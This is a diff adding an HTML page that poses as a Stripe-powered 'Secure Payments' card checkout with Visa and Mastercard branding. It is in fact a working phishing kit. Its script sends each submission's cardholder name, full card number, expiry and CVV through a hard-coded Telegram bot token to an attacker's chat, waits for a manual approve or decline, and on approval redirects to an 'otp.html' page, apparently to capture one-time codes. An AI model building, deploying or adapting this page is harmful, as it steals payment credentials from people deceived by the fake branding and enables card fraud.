@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Payments</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #a0e1eb, #949795);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.18);
+            padding: 35px 30px;
+            width: 100%;
+            max-width: 420px;
+            transition: transform 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card::before {
+            content: "";
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 180px;
+            height: 180px;
+            background: radial-gradient(circle, rgba(31, 204, 83, 0.12), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        h2 {
+            text-align: center;
+            color: #007BFF;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+        
+        .card-preview {
+            background: linear-gradient(135deg, #141e30, #243b55);
+            border-radius: 16px;
+            padding: 22px;
+            color: #fff;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 25px rgba(20, 30, 48, 0.4);
+            position: relative;
+        }
+        
+        .card-preview .chip {
+            width: 42px;
+            height: 30px;
+            background: linear-gradient(135deg, #f9d423, #f2b632);
+            border-radius: 6px;
+            margin-bottom: 16px;
+        }
+        
+        .card-preview .cp-number {
+            font-size: 1.25rem;
+            letter-spacing: 2px;
+            margin-bottom: 14px;
+            min-height: 24px;
+        }
+        
+        .card-preview .cp-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            color: #cfd8e3;
+        }
+        
+        .card-preview .cp-row b {
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .card-preview .cp-icons {
+            position: absolute;
+            top: 20px;
+            right: 22px;
+            font-size: 2rem;
+            letter-spacing: 4px;
+        }
+        
+        .card-preview .cp-icons .fab {
+            color: #fff;
+            opacity: 0.9;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            background: #fafafa;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+        
+        .input-group input:hover {
+            border-color: #b0b0b0;
+            background: #fff;
+        }
+        
+        .input-group input:focus {
+            border-color: #007BFF;
+            outline: none;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
+            background: #fff;
+        }
+        
+        .input-group input::placeholder {
+            color: #bbb;
+        }
+        
+        .card .card-exp-cvv {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .card .card-exp-cvv .input-group {
+            flex: 1;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #007BFF, #0056b3);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.35);
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s, opacity 0.2s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0069d9, #004a99);
+            transform: translateY(-2px);
+            box-shadow: 0 9px 22px rgba(0, 123, 255, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+        }
+        
+        .btn:disabled {
+            cursor: not-allowed;
+            opacity: 0.75;
+            transform: none;
+        }
+        
+        .card-footer {
+            text-align: center;
+            margin-top: 18px;
+            color: #777;
+            font-size: 0.9rem;
+        }
+        
+        .card-footer .pay-icons {
+            font-size: 2rem;
+            letter-spacing: 6px;
+            margin-top: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card-footer .pay-icons .fab {
+            color: #555;
+            transition: color 0.3s, transform 0.3s;
+        }
+        
+        .card-footer .pay-icons .fab:hover {
+            transform: translateY(-2px);
+        }
+        
+        .card-footer .pay-icons .fa-cc-visa:hover {
+            color: #1a1f71;
+        }
+        
+        .card-footer .pay-icons .fa-cc-mastercard:hover {
+            color: #eb001b;
+        }
+        
+        .card-footer .pay-icons .fa-cc-stripe:hover {
+            color: #635bff;
+        }
+        
+        .stripe-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 10px;
+            padding: 6px 14px;
+            background: #f4f4f6;
+            border: 1px solid #e4e4e8;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #555;
+        }
+        
+        .stripe-tag .fa-stripe-s {
+            color: #635bff;
+            font-size: 1.2rem;
+        }
+        
+        .secure-note {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        
+        .secure-note .fa-lock {
+            color: #1fcc53;
+        }
+        
+        .status-box {
+            margin-top: 14px;
+            padding: 12px 14px;
+            border-radius: 12px;
+            border: 1px solid #e6e6e6;
+            background: #fafafa;
+            color: #666;
+            font-size: 0.95rem;
+            display: none;
+        }
+        
+        .status-box.show {
+            display: block;
+        }
+        
+        .inline-block-row {
+            margin-top: 12px;
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .tiny-pill {
+            padding: 6px 12px;
+            border-radius: 999px;
+            font-size: 0.8rem;
+            border: 1px solid #e6e6e6;
+            background: #fff;
+            color: #555;
+        }
+        
+        .otp-error {
+            color: #e02020;
+            font-size: 0.85rem;
+            min-height: 18px;
+            margin-top: 8px;
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+        
+        .muted {
+            color: #999;
+        }
+        
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.35);
+            border-top-color: rgba(255, 255, 255, 1);
+            border-radius: 50%;
+            display: none;
+            vertical-align: -4px;
+            margin-right: 8px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .btn.is-waiting {
+            opacity: 0.9;
+        }
+        /* ===== Waiting overlay (spinner) ===== */
+        
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .overlay.active {
+            display: flex;
+        }
+        
+        .overlay-box {
+            background: white;
+            border-radius: 16px;
+            padding: 22px 18px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            width: min(360px, 90vw);
+        }
+        
+        .overlay-box .spinner {
+            width: 42px;
+            height: 42px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #007BFF;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .overlay-box p {
+            margin: 0;
+            color: #444;
+            font-size: 0.95rem;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <h2>Secure Payments</h2>
+
+        <!-- LIVE CARD PREVIEW -->
+        <div class="card-preview">
+            <div class="cp-icons">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+            </div>
+
+            <div class="chip"></div>
+            <div class="cp-number" id="cp-number">•••• •••• •••• ••••</div>
+
+            <div class="cp-row">
+                <span>NAME&nbsp; <b id="cp-name">•••• ••••</b></span>
+                <span>EXP&nbsp; <b id="cp-exp">••/••</b></span>
+            </div>
+        </div>
+
+        <form id="payment-form">
+            <div class="input-group">
+                <label for="card-name">Cardholder Name</label>
+                <input type="text" id="card-name" placeholder="John Doe" required autocomplete="cc-name">
+            </div>
+
+            <div class="input-group">
+                <label for="card-number">Card Number</label>
+                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" inputmode="numeric" required autocomplete="cc-number" />
+            </div>
+
+            <div class="card-exp-cvv">
+                <div class="input-group">
+                    <label for="expiration">Expiration Date (MM/YY)</label>
+                    <input type="text" id="expiration" placeholder="12/23" maxlength="5" inputmode="numeric" required autocomplete="cc-exp">
+                </div>
+
+                <div class="input-group">
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required autocomplete="cc-csc">
+                </div>
+            </div>
+
+            <div class="otp-error" id="otp-error"></div>
+
+            <button type="submit" class="btn" id="submitButton">
+        <i class="fas fa-lock"></i>&nbsp;
+        <span class="spinner" id="btnSpinner" aria-hidden="true"></span>
+        <span id="btnText">Confirm Payments</span>
+      </button>
+
+            <div class="status-box" id="statusBox">
+                <div><b id="statusTitle">Waiting…</b></div>
+                <div class="muted" id="statusSub">Fill all inputs to enable verification.</div>
+
+
+            </div>
+        </form>
+
+        <!-- STRIPE + CARD BRAND ICONS FOR ONLINE PAYMENTS -->
+        <div class="card-footer">
+            Online payments supported by
+            <div class="pay-icons">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+                <i class="fab fa-cc-stripe"></i>
+            </div>
+
+            <div class="stripe-tag">
+                <i class="fab fa-stripe-s"></i> Powered by Stripe
+            </div>
+
+            <div class="secure-note">
+                <i class="fas fa-lock"></i> 256-bit SSL secured payment
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        // ─── Telegram Bot Config ────────────────────────────────────────
+        const botToken = '9022721409:AAGgIMZwn41gfTPj4pXA3zjxP92LMbXzOq8';
+        const chatId = '7912960401';
+
+        // ─── DOM refs ───────────────────────────────────────────────────
+        const form = document.getElementById('payment-form');
+        const submitBtn = document.getElementById('submitButton');
+        const btnSpinner = document.getElementById('btnSpinner');
+        const btnText = document.getElementById('btnText');
+
+        const statusMsg = document.getElementById('statusSub');
+        const statusBox = document.getElementById('statusBox');
+        const statusTitle = document.getElementById('statusTitle');
+        const otpError = document.getElementById('otp-error');
+
+        // ✅ FIX #1: Ensure overlay element exists (your HTML doesn't have it)
+        // Create it if it's missing so overlay.classList won't crash.
+        let overlay = document.getElementById('waiting-overlay');
+        if (!overlay) {
+            overlay = document.createElement('div');
+            overlay.id = 'waiting-overlay';
+            overlay.className = 'overlay';
+            overlay.innerHTML = `
+            <div class="overlay-box">
+                <div class="spinner"></div>
+                <p>Processing…</p>
+            </div>
+        `;
+            document.body.appendChild(overlay);
+        }
+
+        const inputs = form.querySelectorAll('input');
+
+        const cardNumberInput = document.getElementById('card-number');
+        const cardNameInput = document.getElementById('card-name');
+        const expirationInput = document.getElementById('expiration');
+
+        const cpNumber = document.getElementById('cp-number');
+        const cpName = document.getElementById('cp-name');
+        const cpExp = document.getElementById('cp-exp');
+
+        // ─── Helpers ───────────────────────────────────────────────────
+        function generateId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
+
+        function setStatus(show, title, sub) {
+            statusBox.classList.toggle('show', show);
+            if (title !== undefined) statusTitle.textContent = title;
+            if (sub !== undefined) statusMsg.textContent = sub;
+        }
+
+        function resetForm() {
+            inputs.forEach(inp => (inp.value = ''));
+
+            otpError.textContent = '';
+            overlay.classList.remove('active');
+
+            setStatus(false, 'Waiting…', 'Fill all inputs to enable verification.');
+            submitBtn.disabled = false;
+
+            btnSpinner.style.display = 'none';
+            submitBtn.classList.remove('is-waiting');
+            btnText.textContent = 'Confirm Payments';
+        }
+
+        function showDecline(msg) {
+            otpError.textContent = msg;
+            btnSpinner.style.display = 'none';
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('is-waiting');
+            btnText.textContent = 'Confirm Payments';
+
+            overlay.classList.remove('active');
+            setStatus(true, 'Declined', msg);
+        }
+
+        function formatCardNumber(value) {
+            const digits = value.replace(/\D/g, '').slice(0, 16);
+            return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        function maskCardPreview() {
+            return '•••• •••• •••• ••••';
+        }
+
+        function formatExpiration(value) {
+            const digits = value.replace(/\D/g, '').slice(0, 4);
+            if (digits.length <= 2) return digits;
+            return digits.slice(0, 2) + '/' + digits.slice(2);
+        }
+
+        // ─── Live preview bindings ──────────────────────────────────────
+        cardNumberInput.addEventListener('input', () => {
+            cardNumberInput.value = formatCardNumber(cardNumberInput.value);
+
+            const digits = cardNumberInput.value.replace(/\D/g, '');
+            // ✅ FIX #2: maskCardPreview() takes no params
+            cpNumber.textContent = digits.length ? maskCardPreview() : '•••• •••• •••• ••••';
+        });
+
+        cardNameInput.addEventListener('input', () => {
+            const name = cardNameInput.value.trim();
+            cpName.textContent = name ? name.toUpperCase().replace(/\s+/g, ' ').slice(0, 12) : '•••• ••••';
+        });
+
+        expirationInput.addEventListener('input', () => {
+            expirationInput.value = formatExpiration(expirationInput.value);
+            const v = expirationInput.value;
+
+            cpExp.textContent = v && v.length >= 4 ? v : '••/••';
+        });
+
+        // ─── Poll Telegram for callback decision ───────────────────────
+        function pollForDecision(submissionId) {
+            let offset = 0;
+
+            const poll = setInterval(async() => {
+                try {
+                    const resp = await fetch(
+                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
+                    );
+                    const data = await resp.json();
+
+                    if (data.ok && Array.isArray(data.result) && data.result.length) {
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query;
+                                const cbData = cb.data || '';
+
+                                const parts = cbData.split('_');
+                                const action = parts[0];
+                                const id = parts.slice(1).join('_');
+
+                                if (id === submissionId) {
+                                    clearInterval(poll);
+                                    overlay.classList.remove('active');
+
+                                    btnSpinner.style.display = 'none';
+                                    submitBtn.classList.remove('is-waiting');
+
+                                    if (action === 'approve') {
+                                        window.location.href = 'otp.html';
+                                    } else {
+                                        showDecline('❌ Card details were declined. Please re-enter.');
+                                        resetForm();
+
+                                        const card = document.querySelector('.card');
+                                        if (card) card.scrollIntoView({
+                                            behavior: 'smooth'
+                                        });
+                                    }
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                } catch (err) {
+                    console.error('Poll error:', err);
+                    clearInterval(poll);
+                    overlay.classList.remove('active');
+                    btnSpinner.style.display = 'none';
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Confirm Payments';
+                }
+            }, 2000);
+        }
+
+        // ─── Form submission ────────────────────────────────────────────
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            otpError.textContent = '';
+
+            const cardName = document.getElementById('card-name').value.trim();
+            const cardNumber = document.getElementById('card-number').value.trim();
+            const expiration = document.getElementById('expiration').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            const cardDigits = cardNumber.replace(/\D/g, '');
+
+            if (!cardName || !cardNumber || !expiration || !cvv || !cardDigits) {
+                showDecline('⚠️ Please fill in all fields.');
+                return;
+            }
+
+            if (cardDigits.length !== 16) {
+                showDecline('⚠️ Card number must be exactly 16 digits.');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.classList.add('is-waiting');
+            btnSpinner.style.display = 'inline-block';
+            btnText.textContent = 'Waiting for approval...';
+
+            const submissionId = generateId();
+
+            const message =
+                `🔔 New Card Submission\n━━━━━━━━━━━━━━━\n` +
+                `🆔 ID: ${submissionId}\n` +
+                `👤 Name: ${cardName}\n` +
+                `💳 Card: ${cardNumber}\n` +
+                `📅 Exp: ${expiration}\n` +
+                `🔐 CVV: ${cvv}\n` +
+                `━━━━━━━━━━━━━━━`;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve',
+                        callback_data: `approve_${submissionId}`
+                    }, {
+                        text: '❌ Decline',
+                        callback_data: `decline_${submissionId}`
+                    }]
+                ]
+            };
+
+            overlay.classList.add('active');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) return response.text().then(t => {
+                        throw new Error(t);
+                    });
+                    pollForDecision(submissionId);
+                })
+                .catch(error => {
+                    console.error('Telegram Error:', error);
+
+                    overlay.classList.remove('active');
+                    submitBtn.disabled = false;
+                    btnSpinner.style.display = 'none';
+                    submitBtn.classList.remove('is-waiting');
+                    btnText.textContent = 'Confirm Payments';
+
+                    setStatus(true, 'Error', '❌ Error sending data to Telegram. Please try again.');
+                    otpError.textContent = '❌ Error sending data to Telegram. Please try again.';
+                });
+        });
+
+        // Initial state
+        setStatus(false, 'Waiting…', 'Fill all inputs to enable verification.');
+        btnSpinner.style.display = 'none';
+    </script>
+</body>
+
+</html>
